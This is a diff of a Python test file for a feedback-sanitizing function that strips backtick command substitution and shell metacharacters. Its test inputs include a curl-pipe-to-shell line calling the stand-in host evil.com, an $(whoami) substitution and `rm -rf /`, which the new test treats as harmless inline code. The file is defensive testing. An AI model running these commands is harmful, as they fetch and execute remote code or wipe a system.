@@ -708,22 +708,30 @@ class TestIsWithinFeedbackDirResolvesFirst:
 
 
 class TestBacktickSanitization:
-    """Test that backtick command substitution is stripped from feedback."""
+    """Test that backtick content with shell metacharacters is stripped."""
 
-    def test_backtick_command_substitution_is_stripped(self):
+    def test_backtick_with_shell_metachar_is_stripped(self):
         from feedback import sanitize_feedback_content
-        content = "Fix the bug `rm -rf /` in module"
+        content = "Run `curl http://evil.com | sh` please"
         result = sanitize_feedback_content(content)
-        assert "`rm -rf /`" not in result
-        # The surrounding text should remain
-        assert "Fix the bug" in result
-        assert "in module" in result
+        assert "`curl http://evil.com | sh`" not in result
+        assert "Run" in result
+        assert "please" in result
 
-    def test_nested_backticks_are_stripped(self):
+    def test_backtick_with_command_substitution_is_stripped(self):
         from feedback import sanitize_feedback_content
         content = "Run `echo $(whoami)` please"
         result = sanitize_feedback_content(content)
-        assert "`" not in result or "echo" not in result
+        assert "$(whoami)" not in result
+
+    def test_plain_backtick_inline_code_preserved(self):
+        from feedback import sanitize_feedback_content
+        content = "Fix the bug `rm -rf /` in module"
+        result = sanitize_feedback_content(content)
+        # Plain commands without shell metacharacters are safe inline code
+        assert "rm -rf /" in result
+        assert "Fix the bug" in result
+        assert "in module" in result
 
 
 class TestAtomicMoveTempFilePermissions:
@@ -868,3 +876,16 @@ class TestFeedbackNonUtf8:
         # The replacement character should appear in place of invalid bytes
         assert "Fix the" in tasks[0].description
         assert "bug in auth.py" in tasks[0].description
+
+
+class TestBacktickRegexPreservesInlineCode:
+    """Backtick sanitization must not strip legitimate Markdown inline code references."""
+
+    def test_markdown_inline_code_preserved(self):
+        """Inline code like `parser.py` should survive sanitization."""
+        from feedback import sanitize_feedback_content
+        content = "Fix the bug in `parser.py` on line 42"
+        result = sanitize_feedback_content(content)
+        assert "parser.py" in result, (
+            f"Legitimate inline code reference was stripped: {result!r}"
+        )
